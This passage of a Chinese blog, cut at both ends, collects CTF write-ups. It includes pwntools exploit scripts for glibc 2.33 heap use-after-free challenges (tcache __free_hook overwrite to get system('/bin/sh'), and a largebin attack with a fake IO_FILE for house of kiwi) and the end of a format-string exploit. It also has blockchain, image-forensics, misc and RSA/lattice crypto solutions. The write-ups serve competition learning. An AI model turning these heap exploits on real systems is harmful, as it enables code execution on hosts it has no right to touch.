Dest0g3?\\n&#x27;,&#x27;%&#123;&#125;c%39$hn&#x27;.format(target % 0x10000))r.sendafter(b&#x27;What about your love to Dest0g3?\\n&#x27;,&#x27;%1314520c%12$n&#x27;)r.interactive() ​ ezuaf主要代码： 1234567891011121314151617181920212223242526272829303132333435363738394041void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; int v3; // [rsp+Ch] [rbp-114h] sub_11C5(a1, a2, a3); while ( 1 ) &#123; menu(); v3 = read_n(); switch ( v3 ) &#123; case 1: add(); break; case 2: edit(); break; case 3: delete(); break; case 4: show(); break; default: puts(&quot;Invaild Choice!&quot;); break; &#125; &#125;&#125;void delete()&#123; signed int v0; // [rsp+Ch] [rbp-4h] puts(&quot;Please tell me the index: &quot;); v0 = read_n(); if ( *((_QWORD *)&amp;unk_40C0 + v0) &amp;&amp; (unsigned int)v0 &lt;= 0xF ) free(*((void **)&amp;unk_40C0 + v0)); else puts(&quot;Invalid Index!&quot;);&#125; 高版本（2.33）的UAF漏洞利用，在tcache里写入__free_hook，再写入system。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *r = remote(&#x27;node4.buuoj.cn&#x27;,26427)libc = ELF(&#x27;./libc-2.33.so&#x27;)def add(size,content): r.sendlineafter(&#x27;4. show\\n: &#x27;,&#x27;1&#x27;) r.sendlineafter(&#x27;Please tell me its size: &#x27;,str(size)) r.sendafter(&#x27;Content: &#x27;,content) def edit(idx,content): r.sendlineafter(&#x27;4. show\\n: &#x27;,&#x27;2&#x27;) r.sendlineafter(&#x27;Please tell me the index: &#x27;,str(idx)) r.sendafter(&#x27;Please tell me its content: &#x27;,content)def delete(idx): r.sendlineafter(&#x27;4. show\\n: &#x27;,&#x27;3&#x27;) r.sendlineafter(&#x27;Please tell me the index: &#x27;,str(idx)) def show(idx): r.sendlineafter(&#x27;4. show\\n: &#x27;,&#x27;4&#x27;) r.sendlineafter(&#x27;Please tell me the index: \\n&#x27;,str(idx))add(0x7f,&#x27;a&#x27;)add(0x40,&#x27;a&#x27;)add(0x40,&#x27;a&#x27;)add(0x50,&#x27;/bin/sh&#x27;)for i in range(7): delete(0) edit(0,p64(0)*2+&#x27;\\n&#x27;) delete(0)show(0)libc_base = u64(r.recv(6).ljust(8,&#x27;\\x00&#x27;))-0x1e0c00#print(hex(libc_base))delete(2)show(2)heap_addr1 = ((u64(r.recv(8)) &lt;&lt; 12) % (2**64)) + 0x380#print(hex(heap_addr1))delete(1)show(1)free_hook = libc_base + libc.sym.__free_hook#print(hex(free_hook))heap_addr2 = (((u64(r.recv(8)) ^ heap_addr1) &lt;&lt; 12) % (2**64)) + 0x330#print(hex(heap_addr2))next = ((heap_addr2 &gt;&gt; 12) % (2**64)) ^ free_hookedit(1,p64(next)+&#x27;\\n&#x27;)add(0x40,&#x27;a&#x27;)system_addr = libc_base + libc.sym.system#print(hex(system_addr))add(0x40,p64(system_addr))delete(3)r.interactive() ​ emma主要代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107void __fastcall __noreturn main(const char *a1, char **a2, char **a3)&#123; int v3; // eax init_0(); while ( 1 ) &#123; while ( 1 ) &#123; menu(); read_n(); if ( v3 != 4 ) break; delete(a1, a2); &#125; if ( v3 &gt; 4 ) &#123;LABEL_12: a1 = &quot;Invaild Choice!&quot;; puts(&quot;Invaild Choice!&quot;); &#125; else &#123; switch ( v3 ) &#123; case 3: show(a1, a2); break; case 1: add(a1, a2); break; case 2: edit(a1, a2); break; default: goto LABEL_12; &#125; &#125; &#125;&#125;void add()&#123; int v0; // eax int v1; // eax int v2; // [rsp+0h] [rbp-10h] int v3; // [rsp+4h] [rbp-Ch] void *buf; // [rsp+8h] [rbp-8h] puts(&quot;Index: &quot;); read_n(); v2 = v0; puts(&quot;Size: &quot;); read_n(); v3 = v1; if ( v1 &gt; 1047 &amp;&amp; v1 &lt;= 4096 ) &#123; buf = malloc(v1); puts(&quot;Content&quot;); read(0, buf, v3); qword_4060[v2] = buf; dword_40E0[v2] = v3; &#125;&#125;ssize_t edit()&#123; int v0; // eax ssize_t result; // rax int v2; // [rsp+Ch] [rbp-4h] puts(&quot;Index: &quot;); read_n(); v2 = v0; result = qword_4060[v0]; if ( result ) &#123; puts(&quot;Content&quot;); return read(0, (void *)qword_4060[v2], (int)dword_40E0[v2]); &#125; return result;&#125;int show()&#123; int v0; // eax __int64 v1; // rax int v3; // [rsp+Ch] [rbp-4h] puts(&quot;Index: &quot;); read_n(); v3 = v0; v1 = qword_4060[v0]; if ( v1 ) LODWORD(v1) = puts((const char *)qword_4060[v3]); return v1;&#125;void delete()&#123; int v0; // eax puts(&quot;Index: &quot;); read_n(); if ( *((_QWORD *)&amp;qword_4060 + v0) ) free(*((void **)&amp;qword_4060 + v0));&#125; 同样是高版本（2.33）的UAF，最小申请0x417大小的chunk； 先用负idx修改stderr指针，再利用LargeBin Attack修改__pointer_chk_guard，伪造stderr修改vtable，最后改topchunk触发house of kiwi。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)context.log_level = &#x27;debug&#x27;r = remote(&#x27;node4.buuoj.cn&#x27;,&#x27;25443&#x27;)elf = ELF(&#x27;./pwn&#x27;) libc = ELF(&#x27;libc-2.33.so&#x27;) def add(idx,size,data): r.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;) r.sendlineafter(&#x27;Index:&#x27;,str(idx)) r.sendlineafter(&#x27;Size:&#x27;,str(size)) r.sendlineafter(&#x27;Content&#x27;,data)def edit(idx,data): r.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;) r.sendlineafter(&#x27;Index:&#x27;,str(idx)) r.sendafter(&#x27;Content&#x27;,data)def show(idx): r.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;) r.sendlineafter(&#x27;Index:&#x27;,str(idx))def delete(idx): r.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;4&#x27;) r.sendlineafter(&#x27;Index:&#x27;,str(idx))def ROL(content, key): tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;) return int(tmp[key:] + tmp[:key], 2)add(0,0x460,&#x27;a&#x27;*0x40 + p64(0)*4 + &#x27;cat flag&#x27;)add(1,0x420,&#x27;b&#x27;*0x40)add(2,0x440,&#x27;c&#x27;*0x40)add(3,0x420,&#x27;d&#x27;*0x40)delete(0)edit(0,&#x27;\\x01&#x27;)show(0)libc_base = (u64(r.recvuntil(&#x27;\\x7f&#x27;).ljust(8,&#x27;\\x00&#x27;)) &gt;&gt; 16) - libc.sym.__malloc_hook - 0x71print(hex(libc_base))edit(0,&#x27;\\x00&#x27;)add(4,0x470,&#x27;e&#x27;*0x40)delete(2)edit(0,&#x27;a&#x27;*0x10)show(0)r.recvuntil(&#x27;a&#x27;*0x10)heap_addr = u64(r.recv(6).ljust(8,&#x27;\\x00&#x27;))print(hex(heap_addr))heap_base = heap_addr - 0x290global_max_fast = libc_base + 0x1e3e78stderr_chain = libc_base + 0x1e1648__pointer_chk_guard = libc_base + 0x1ed5b0print(hex(__pointer_chk_guard))edit(0,p64(libc_base+0x1e1000)*2 + p64(heap_addr) + p64(__pointer_chk_guard-0x20) + &#x27;\\n&#x27;)add(5,0x480,&#x27;f&#x27;*0x40) target = libc_base + libc.sym.systemio_cookie_jumps = libc_base + 0x1e1a20fake_IO_FILE = p64(0x00000000fbad2087)+3 * p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0xffffffffffffffff) fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)*4fake_IO_FILE += p64(0) fake_IO_FILE += p64(0)*3fake_IO_FILE += p64(libc_base + 0x1e3660) fake_IO_FILE += p64(0)*7fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(io_cookie_jumps + 0x40)fake_IO_FILE += p64(heap_base + 0x300)fake_IO_FILE += p64(0)fake_IO_FILE += p64(ROL(target ^ (heap_base+0xb30),0x11))add(-4,0x500,fake_IO_FILE)add(6,0x700,&#x27;6&#x27;*0x40)delete(6)add(7,0x500,&#x27;7&#x27;*0x40)edit(6,&#x27;a&#x27;*0x508+p64(0x300))add(8,0xff0,&#x27;8&#x27;*0x40)r.interactive() ​ BLOCKCHAINWhere the flag？ 123456789contract find&#123; uint96 private a=7855; address private owner=msg.sender; bool private f=false; bool private t=true; string[] private flag=[flag1,flag2];&#125;//https://ropsten.etherscan.io/address/0x78f2b5695e5e6e51fc0fd6d7e0caaa05190af9cc 应该是非预期，访问url进入合约，在交易0x2a00af3b2a2a939c491359e7960cbcbda6bdb4d45294fbb8d857100cbfb700e1的InputData里，可以查看到Hex数据，转字符串可得到flag两截字符串：Dest0g3&#123;0n1y_u5e_priv4t3_i，5_n0t_s4f3_1n_B1okCh4in!&#125;。 ​ Easy predict 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576contract storageplace&#123; mapping(uint=&gt;string)private _flag; address owner; constructor()public&#123; owner=msg.sender; &#125; function flag() public view returns(string memory) &#123; require(msg.sender==owner); &#125; function buy(uint number) public returns(bytes1)&#123; require(msg.sender==owner); &#125;&#125;contract question&#123; mapping(address=&gt;bool)public regeister; mapping(address=&gt;uint)private seed; uint constant Price_Per_Char=10 ether; address owner; storageplace immutable Flag; constructor() public &#123; owner=msg.sender; storageplace _Flag = new storageplace(); Flag = _Flag; &#125; modifier isowner()&#123; require(msg.sender==owner,&quot;I think you are not the rignt person&quot;); _; &#125; function addRight(address tar)public isowner&#123; regeister[tar]=true; &#125; function removeRight(address tar)public isowner&#123; regeister[tar]=false; &#125; function regeist() public &#123; require(regeister[msg.sender]==false); regeister[msg.sender]=true; seed[msg.sender]=block.number+1; &#125; function buyflag(uint want) public payable returns(bytes1)&#123; require(msg.value==Price_Per_Char,&quot;is not free&quot;); return Flag.buy(want); &#125; function query(bytes32 answer) public view returns(string memory) &#123; require(regeister[msg.sender]); require(block.number &gt;seed[msg.sender],&quot;too early&quot;); bytes32 result = blockhash(seed[msg.sender]); require(answer==result,&quot;wrong answer&quot;); return Flag.flag(); &#125; function withdraw() public payable&#123; require(msg.sender==owner); msg.sender.transfer(address(this).balance); &#125;&#125;https://ropsten.etherscan.io/tx/0xd994796e78b5f5ff0d0f0738c29dbce8db0e8b32132cd0e6a10b24fa79b48925 也是非预期，访问url进入交易0xd994796e78b5f5ff0d0f0738c29dbce8db0e8b32132cd0e6a10b24fa79b48925，在InputData里，可以查看到Hex数据，转字符串可得到flag五截字符串：Dest0g3&#123;t，_sup3r_e3，hi5_1s_4，ea5y_p，_r1ght?&#125;，按英文字面意思拼接，得：Dest0g3&#123;thi5_1s_4_sup3r_e3ea5y_pe1d1ct_r1ght?&#125;。 ​ AIOCR OCR is very useful in ctf！ 更像Misc的AI题，png图片扭曲，应该宽度不对，CRC值爆破宽高： 123456789101112131415161718192021222324252627import binasciiimport structimport sysfr = open(&#x27;flag_pic.png&#x27;,&#x27;rb&#x27;).read()data = bytearray(fr[0x0c:0x1d])crc32key = eval(&#x27;0x&#x27;+str(binascii.b2a_hex(fr[0x1d:0x21]))[2:-1])n = 4095for w in range(n): width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w)) for h in range(n): height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = binascii.crc32(data) &amp; 0xffffffff if crc32result == crc32key: print(width,height) newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(&#x27;flag2.png&#x27;,&#x27;wb&#x27;) fw.write(newpic) fw.close sys.exit() 得到正常图片： 找个在线OCR识别图里字符，得到的结果有部分字符不正确，手动修正，得到： 12345678910111213141516171819377ABCAF271C000451FCF397500200000000000062000000000000001D9C97C8E004D002485D0022194A676D2FDE351A055c168F9710364AE2D581126E378F3B4c47E15E2E80B74234B849430A221F40C086E06B24ADAAC47F32CB62CADD154B50723E65E50CDF99CC2B953916AD2204D70C15FB493BD4C2E1F93902FB3563190ACEE58CC01621BB2AAAB6EED8CE892FEF5F0927E2C4BCD7C188277D09D0357995A2FB65D31CD99c853D7BAF52EAD8555920D1672B4A3B713917E98FB324AD225A3FA2AFAC1435FFE31ED0C0CEF0CA0B68C0CCCA81C458680D7C75139429D282984933F7ACFDFB127321D9F4EFC0FEAAE92F985D3C457E90AFBC4DA9D11B23E507A0953036A2EC1D75D69CD1F6A9F0790B1AB02D6C2AFFDF66A2E7E56A1070FBCD316813E12DF9E26FC4813D419792A65960D4D97EDFA7A978A0385C04CF36EFDE3B07DF9B9405253EAA838149910F2571FAA4A8E085D1567C5C17C9B3400F91FBFE6B47E052BA07097C9D77803D3A45E3477FE324603179C7CA6A128CDC0F7E834812618AD4C79934226637E9300C5595E355139A2ECF661A5F63750A6A0035ACF52417AF3A1C1FEA14471D074c27F81c719D98717F4ECD32918BD15C18AB93769E94DDEFD3B6FAF4DDD6628BA44BDEF574FCCD5589334EA8063D7B27A2F0600FC864D010A7F0CEC9B9395434878D01943887194342F9D34FC8F12DD4556ED5A5A36667F9319A0395DB9A445B94C44771B406F962B1CFC8535BA0D3EE3DDDEB876C95092AAB192B168A732F3A7B9E8156c403c583983F5527A0D6c5D6928481D56955474046D9FC17A2DE21F3D6FC4c69644E7c6A141BE948A417A33D62C6FF6DFAC702A0FC101748D9A9C64A6A0000010406000109825000070B010001212101000C84D100080A0196EAFE6000000501190A0000000000000000000011190044006500730074003000670033002E00740078007400000019020000140A0100B547E05F6654D8011506010020000000000000 以Hex保存为7z压缩包文件，解压得到 RGVzdDBnM3szNDUxMjA5OC0zMzA5LTc3MTItODg2NS03ODM0NjAyMjE2NDd9，base64解码即flag：Dest0g3&#123;34512098-3309-7712-8865-783460221647&#125;。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"HSC-1th 2022","slug":"match-HSC-1th-2022","date":"2022-02-20T08:28:40.000Z","updated":"2022-02-21T11:24:05.717Z","comments":true,"path":"2022/02/20/match-HSC-1th-2022/","permalink":"https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/","excerpt":"","text":"​ 本届HSC1th 2022是由社会战队红客突击队（Honker Security Commando）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web，crypto，misc，re等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。 Rank: 2 MISCSign-in 前往红客突击队公众号发送“HSC2019”并签到吧！ 公众号签到。 flag{HSC_W3LC0M3} ​ DORAEMONzip压缩包注释 哆啦A梦把泡好的QR放进口袋后，用六位数字把自己放好了。你能找到它吗？，爆破得到密码 376852； 得到png图片用16进制修改器修改高度，得到缺少两个定位图案的二维码； 修复上方两个定位图案，扫描得flag：flag{sing1emak3r10v3m!sc} ​ 汝闻,人言否png文件后存在zip压缩包，提取后在16进制查看器下修复压缩包，将两处 4B 50 修改为 50 4B； 发现zip压缩包加密，注释 qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p 为键盘密码，在键盘上画出六个字母 WVALOU 为解压密码，得到 flag 文件，16进制查看发现为wav文件结构； 使用audacity查看wav文件，在频谱图发现flag：flag:e5353bb7b57578bd4da1c898a8e2d767 ​ PERFORMANCE-ART两种图形替换密码的混合，其中一种为标准银河字母（Standard Galactic Alphabet），猜测另一种代表数字，根据形状和出现概率，猜测出前几位 504B0304140000000，为zip压缩包文件头。 依次还原所有字符： 12345678910504b03041400000008004a7e7253148e1e1e160000001400000006000000756e6b6e6f778bcaadc888322ec9f30b752df70ccfae8cca72b30400504b01021f001400000008004a7e7253148e1e1e1600000014000000060024000000000000002000000000000000756e6b6e6f770a0020000000000001001800778284ef50dcd7016b04efef50dcd701e1b0ef144fdcd701504b05060000000001000100580000003a0000000000 保存为zip文件，打开得到内容 ZmxhZ3tnNUEwIWkyZjF9，base64解码得flag：flag{g5A0!i2f1} ​ WIRESHARKzip压缩包后存在png图片，提取后使用zsteg查看LSB隐写，在 b1,rgb,lsb,xy 通道隐写了一张png图片，提取： zsteg -E &quot;b1,rgb,lsb,xy&quot; Untitled1.png &gt; out.png 是一张二维码，扫描得到内容 wrsak..iehr370，栅栏解密 wireshark3.7.0； 解压最开始的zip压缩包得到 wireshark，16进制查看发现为pdf文件结构，文件头被修改过，还原为 %PDF （25 50 44 46）正常打开，内容无有用信息，猜想为PDF隐写； 使用wbStego工具从pdf文件成功提取出flag：flag{Go0dJ0B_y0ufIndLt} ​ PCXP 百度网盘https://pan.baidu.com/s/12q5ULEp_RD62MwbV5eE11A 提取码：1qih 奶牛快传https://cowtransfer.com/s/b76470ddc9e04a 蓝奏云https://wwo.lanzouy.com/b030r1x4j 密码:cvi0 本题目文件PCXP1与PCXP2均需要下载！ 本题文件中flag{raw_Imfig3_mLs3}属于干扰项 两个dump内存的raw文件，用volatility分析。 其中一个发现 ffflaaagggg.rar 文件： 0x000000000227db70 1 0 R--rwd \\Device\\HarddiskVolume1\\Documents and Settings\\Administrator\\My Documents\\My Music\\ffflaaagggg.rar 根据提示，另一个发现 mirror.rar 文件： 0x00000000021221e0 1 0 R--rwd \\Device\\HarddiskVolume1\\Documents and Settings\\Administrator\\My Documents\\My Music\\mirror.rar 分别dumpfiles，按注释key:mirror 解压 mirror.rar，提取 mirror.png，发现后半部分有反转的png，reverse处理得到png内有密码 HSC-1th202248H ； 用密码解压 ffflaaagggg.rar，得到 secret.pcap，用tshark提取USB流量无结果； 查看16进制发现存在PNG文件头，用foremost提取出两张png图片，画面相同大小不同，猜测为盲水印隐写； 使用BlindWaterMark工具提取： python3 bwmforpy3.py decode 00000030.png 00000094.png out.png 得到flag：flag{Wat3rMarkPtysc} ​ CRYPTOEasy SignIn 5445705857464579517A4A48546A4A455231645457464243566B5579556C7053546C4A4E524564565646644D515670455130354C5755644F5231685256314A5452315A5552304E57576C5A49525430395054303950513D3D ciphey一把梭，flag：flag{welc0me_to_my_s1gn_in} ​ AFFINE flag{md5(result)} 1234567891011121314151617181920212223242526272829# -*- coding: utf-8 -*-import stringimport hashlibletter=string.ascii_letters+string.digitsdef encrypt(m, c, a, b): for i in range(len(m)): ch=m[i] t=(letter.index(ch) * a + b) % 62 c.append(letter[t]) d = &#x27;&#x27;.join(c) print(d)m = c = []a = b = assert (&quot;flag&quot; in m)print(&quot;加密后的密文为：&quot;)Cipher = encrypt(m, c, a, b)flag = hashlib.md5(&quot;&quot;.join(str(m)).encode(&quot;utf8&quot;)).hexdigest()#print(flag)&quot;&quot;&quot;加密后的密文为：xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&quot;&quot;&quot; 仿射密码加密，先根据密文和明文，爆破各位置存在 flag 字符串情况下对应的 a,b 值，再解密整串密文。 爆破求 a,b： 12345678910111213141516171819202122import stringimport hashlibletter=string.ascii_letters+string.digitsdef encrypt(m, a, b): c = [] for i in range(len(m)): ch=m[i] t=(letter.index(ch) * a + b) % 62 c.append(letter[t]) d = &#x27;&#x27;.join(c) return ds=&#x27;xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&#x27;for a in range(50): for b in range(50): Cipher = encrypt(&#x27;flag&#x27;, a, b) for k in range(len(s)-3): if Cipher==s[k:k+4]: print(Cipher,a,b)# korv 11 17 解密： 12345678910111213141516171819a=11b=17def decrypt(m, a, b): import gmpy2 c = [] for i in range(len(m)): ch=m[i] t=((letter.index(ch) - b) * gmpy2.invert(a,62)) % 62 c.append(letter[t]) d = &#x27;&#x27;.join(c) return dm=decrypt(s, a, b)print(m)flag = hashlib.md5(&quot;&quot;.join(str(m)).encode(&quot;utf8&quot;)).hexdigest()print(flag)# Oh62Affine1sSti1lN0tSecureEnoughToProtectflag# 2b9b99caae1cc49e5b5aacbc8cc22350 flag：flag{2b9b99caae1cc49e5b5aacbc8cc22350} ​ LINE-GENERATION-TEST “Sorry, Tazmi, I can’t hold you in my arms anymore” Who said that? flag{md5(result)} 根据 enc 结果，猜测为 $\\mod 26$ 下的矩阵运算，值对应字母序，简单用z3解： 1234567891011121314151617181920212223242526from z3 import *f=[Int(f&#x27;f&#123;i&#125;&#x27;) for i in range(5)]out=[9,23,0,13,19]ss=Solver()ss.add((f[0]+f[1])%26==out[0])ss.add((f[1]+f[4])%26==out[1])ss.add((f[2]+f[3]+f[4])%26==out[2])ss.add((f[1]+f[2]+f[3])%26==out[3])ss.add((f[3])%26==out[4])for i in range(5): ss.add(f[i]&gt;=0) ss.add(f[i]&lt;26)ss.check()m=ss.model()print(m)res=&#x27;&#x27;for i in range(5): res+=chr(m[f[i]].as_long()+ord(&#x27;A&#x27;))print(res)# RSCTF MD5，得flag：flag{e4163deba70420c58acb87abcab34141} ​ LATTICE 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#!/usr/bin/env python# -*- coding: utf-8 -*-from Crypto.Util.number import *from gmpy2 import *flag = b&#x27;flag&#123;******&#125;&#x27;.strip(b&#x27;flag&#123;&#x27;).strip(b&#x27;&#125;&#x27;)_length = len(flag)f1, f2, f3 = [flag[_*_length//3:(_+1)*_length//3] for _ in range(3)]e = 0x10001# part1m1 = bytes_to_long(f1)p1 = getPrime(1024)q1 = getPrime(1024)n1 = p1 * q1phi1 = n1 - p1 - q1 + 1c1 = pow(m1, e, n1)e1 = invert(getPrime(730), phi1)e2 = invert(getPrime(730), phi1)print(f&quot;c1=&#123;c1&#125;&quot;)print(f&quot;n1=&#123;n1&#125;&quot;)print(f&quot;e1, e2=&#123;e1&#125;, &#123;e2&#125;&quot;)# c1=...# n1=...# e1, e2=...# part2m2 = bytes_to_long(f2)p2 = getPrime(1024)q2 = getPrime(1024)n2 = p2 * q2phi2 = n2 - p2 - q2 + 1c2 = pow(m2, e, n2)e1 = invert(getPrime(818), phi2)e2 = invert(getPrime(818), phi2)e3 = invert(getPrime(818), phi2)print(f&quot;c2=&#123;c2&#125;&quot;)print(f&quot;n2=&#123;n2&#125;&quot;)print(f&quot;e1, e2, e3=&#123;e1&#125;, &#123;e2&#125;, &#123;e3&#125;&quot;)# c2=...# n2=...# e1, e2, e3=...# part3m3 = bytes_to_long(f3)nl = []cl = []el = []d = getPrime(890)for _ in range(7): p3 = getPrime(1024) q3 = getPrime(1024) n3 = p3 * q3 phi3 = n3 - p3 - q3 + 1 e3 = invert(d, phi3) c3 = pow(m3, e3, n3) nl.append(n3) el.append(int(e3)) cl.append(int(c3))print(f&quot;nl=&#123;nl&#125;&quot;)print(f&quot;el=&#123;el&#125;&quot;)print(f&quot;cl=&#123;cl&#125;&quot;)# nl=[...]# el=[...]# cl=[...] RSA的两种涉及格的LLL算法的攻击情形（多组低解密指数攻击+共私钥指数攻击）。 Part1，2组 $e$ 的低解密指数攻击： 12345678910111213141516171819202122232425262728# Sageimport gmpy2N = e1 = e2 = c = for i in range(1000): alpha2 = i/1000 M1 = int(gmpy2.mpz(N)**0.5) M2 = int( gmpy2.mpz(N)**(1+alpha2) ) D = diagonal_matrix(ZZ, [N, M1, M2, 1]) B = Matrix(ZZ, [ [1, -N, 0, N**2], [0, e1, -e1, -e1*N], [0, 0, e2, -e2*N], [0, 0, 0, e1*e2] ]) * D L = B.LLL() v = Matrix(ZZ, L[0]) x = v * B**(-1) phi = (x[0,1]/x[0,0]*e1).floor() try: d = inverse_mod(65537, phi) m = bytes.fromhex(hex(power_mod(c, d, N))[2:]) if len(m)&lt;20: print(m) break except: pass# b&#x27;89c63fd5-00c&#x27; Part2，3组 $e$ 的低解密指数攻击： 123456789101112131415161718192021222324252627282930313233343536373839# Sageimport gmpy2N = e1 = e2 = e3 = c = for i in range(1000): alpha2 = i/1000 M1 = int(gmpy2.mpz(N)**(3./2)) M2 = int( gmpy2.mpz(N) ) M3 = int(gmpy2.mpz(N)**(3./2 + alpha2)) M4 = int( gmpy2.mpz(N)**(0.5) ) M5 = int( gmpy2.mpz(N)**(3./2 + alpha2) ) M6 = int( gmpy2.mpz(N)**(1.+alpha2) ) M7 = int( gmpy2.mpz(N)**(1.+alpha2) ) D = diagonal_matrix(ZZ, [M1, M2, M3, M4, M5, M6, M7, 1]) B = Matrix(ZZ, [ [1, -N, 0, N**2, 0, 0, 0, -N**3], [0, e1, -e1, -e1*N, -e1, 0, e1*N, e1*N**2], [0, 0, e2, -e2*N, 0, e2*N, 0, e2*N**2], [0, 0, 0, e1*e2, 0, -e1*e2, -e1*e2, -e1*e2*N], [0, 0, 0, 0, e3, -e3*N, -e3*N, e3*N**2], [0, 0, 0, 0, 0, e1*e3, 0, -e1*e3*N], [0, 0, 0, 0, 0, 0, e2*e3, -e2*e3*N], [0, 0, 0, 0, 0, 0, 0, e1*e2*e3] ]) * D L = B.LLL() v = Matrix(ZZ, L[0]) x = v * B**(-1) phi_ = (e1*x[0,1]/x[0,0]).floor() try: d = inverse_mod(65537, phi_) m = hex(power_mod(c, d, N))[2:] m = bytes.fromhex(hex(power_mod(c, d, N))[2:]) if len(m)&lt;20: print(m) break except: pass# b&#x27;f-4ae0-b369-&#x27; Part3，共私钥指数 $d$ 攻击： 12345678910111213141516171819202122232425262728293031323334from gmpy2 import *nl=[...]el=[...]cl=[...]ind=[]nl_s=sorted(nl)for i in range(7): ind.append(nl.index(nl_s[i]))print(ind)e=[]n=[]c=[]for i in range(7): e.append(el[ind[i]]) n.append(nl[ind[i]]) c.append(cl[ind[i]])M=iroot(int(n[6]),int(2))[0]a=[0]*8a[0]=[M,e[0],e[1],e[2],e[3],e[4],e[5],e[6]]a[1]=[0,-n[0],0,0,0,0,0,0]a[2]=[0,0,-n[1],0,0,0,0,0]a[3]=[0,0,0,-n[2],0,0,0,0]a[4]=[0,0,0,0,-n[3],0,0,0]a[5]=[0,0,0,0,0,-n[4],0,0]a[6]=[0,0,0,0,0,0,-n[5],0]a[7]=[0,0,0,0,0,0,0,-n[6]]Mat = matrix(ZZ,a)Mat_LLL=Mat.LLL()d = abs(Mat_LLL[0][0])//Mprint(d)print(bytes.fromhex(hex(pow(c[6],int(d),int(n[6])))[2:]))# b&#x27;5a3d94a20a2c&#x27; 连接得flag：flag{89c63fd5-00cf-4ae0-b369-5a3d94a20a2c} ​ RSA flag{md5(result)} 1234567891011121314151617181920import gmpy2import sympyfrom Crypto.Util.number import *flag = b&#x27;????&#x27;z=getPrime(1024)p=sympy.nextprime(z)q=sympy.prevprime(10*z)n=p*qm=bytes_to_long(flag)e=0xe18ec=pow(m,e,n)print(&quot;n=&quot;,n)print(&quot;c=&quot;,c)#n= ...#c= ... 费马分解RSA，发现 $\\gcd(e,\\varphi(n))=2$，令 $e’=\\frac{e}{2},m’=m^2$， 先求出 $m’$，再利用Rabin算法求 $m$。 12345678910111213141516171819202122232425262728293031323334n = c = e = 0xe18eimport gmpy2p = gmpy2.iroot(n//10,2)[0]while 1: p = gmpy2.next_prime(p) if n%p==0: breakq = n//pf = (p-1)*(q-1)d = gmpy2.invert(e//2,f)mm = pow(c,d,n)print(mm)def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) // 4, p) mq = pow(c, (q + 1) // 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) m = rabin_decrypt(mm,p,q)for i in range(4): try: print(bytes.fromhex(hex(m[i])[2:])) except: pass# b&#x27;flag&#123;6d22773623d3d5c871692e9985de5f16&#125;&#x27; ​ BABY-RSA 1234567891011121314151617181920212223242526272829303132333435363738394041424344from Crypto.Util.number import *def lfsr(status,mask): out = (status &lt;&lt; 1) &amp; 0xffffffff i=(status&amp;mask)&amp;0xffffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 out^=lastbit return (out,lastbit)status= 1mask = 0b10110001110010011100100010110101num = bytes_to_long(m)p = getPrime(1024)q = getPrime(1024)n = p*qe = 65537hp = bin(p)[2:]c = pow(num, e, n)print(&quot;n=&quot;,n)print(&quot;c=&quot;,c)f=open(&quot;key&quot;,&quot;w+&quot;,encoding=&#x27;utf-8&#x27;)for i in range(568): curnum = int(hp[i]) (status,out)=lfsr(status,mask) f.write(str(curnum ^ out))f.close()&#x27;&#x27;&#x27;n= ...c= ...&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;key:0101110100100111011011011000111010000111101000101010100100100011010111011000010010100101110110011101110110010100010111001110010011101010111011001100011011010110001010011111111110100110101010101110100110011010110101110110000110010101010000010110100110110110001110101011000011110100011011100101101101001000110010100111000111001111010101011011111110010111100101111001010000100010100001000111010011011111010011101100011101011010011010110001101110110110000110010011001101100000110000110100101010010010110101100101111101110000010011101110010101110100011101100110111111001010&#x27;&#x27;&#x27; RSA $p$ 高位泄露攻击+LFSR。 先用LFSR结果异或还原 $p$ 高位 $hp$： 123456789101112131415161718192021222324def lfsr(status,mask): out = (status &lt;&lt; 1) &amp; 0xffffffff i=(status&amp;mask)&amp;0xffffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 out^=lastbit return (out,lastbit)status= 1mask = 0b10110001110010011100100010110101c = 